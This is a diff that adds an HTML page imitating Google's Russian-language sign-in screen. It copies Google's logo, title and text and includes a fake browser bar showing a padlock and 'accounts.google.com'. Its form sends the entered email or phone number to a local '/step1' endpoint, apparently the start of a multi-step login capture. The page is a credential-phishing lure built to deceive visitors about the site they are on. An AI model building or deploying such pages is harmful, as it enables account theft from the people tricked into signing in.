@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Вход – аккаунты Google</title>
+<link rel="stylesheet" href="/static/style.css">
+<script>
+  (function() {
+    var saved = localStorage.getItem('theme');
+    if (saved) document.documentElement.setAttribute('data-theme', saved);
+  })();
+</script>
+</head>
+<body>
+  <button class="theme-toggle" onclick="toggleTheme()" title="Сменить тему">◐</button>
+
+  <div class="chrome-bar">
+    <span>🔒</span>
+    <span>accounts.google.com</span>
+  </div>
+
+  <img class="logo" src="/static/google_logo.png" alt="Google">
+  <h1>Вход</h1>
+  <p class="sub">Используйте аккаунт Google</p>
+
+  <form action="/step1" method="POST" autocomplete="off">
+    <div class="field">
+      <input type="text" name="email" required autofocus>
+      <label>Телефон или электронный адрес</label>
+    </div>
+    <a class="link" href="#">Забыли адрес электронной почты?</a>
+
+    <p class="hint">
+      Не ваш компьютер? Включите гостевой режим,
+      чтобы защитить данные в аккаунте.
+      <a href="#">Подробнее об использовании гостевого режима</a>
+    </p>
+
+    <div class="actions">
+      <a class="create" href="#">Создать аккаунт</a>
+      <button type="submit">Далее</button>
+    </div>
+  </form>
+
+<script>
+  function toggleTheme() {
+    var current = document.documentElement.getAttribute('data-theme');
+    if (!current) {
+      var systemDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
+      current = systemDark ? 'dark' : 'light';
+    }
+    var next = current === 'dark' ? 'light' : 'dark';
+    document.documentElement.setAttribute('data-theme', next);
+    localStorage.setItem('theme', next);
+  }
+</script>
+</body>
+</html>
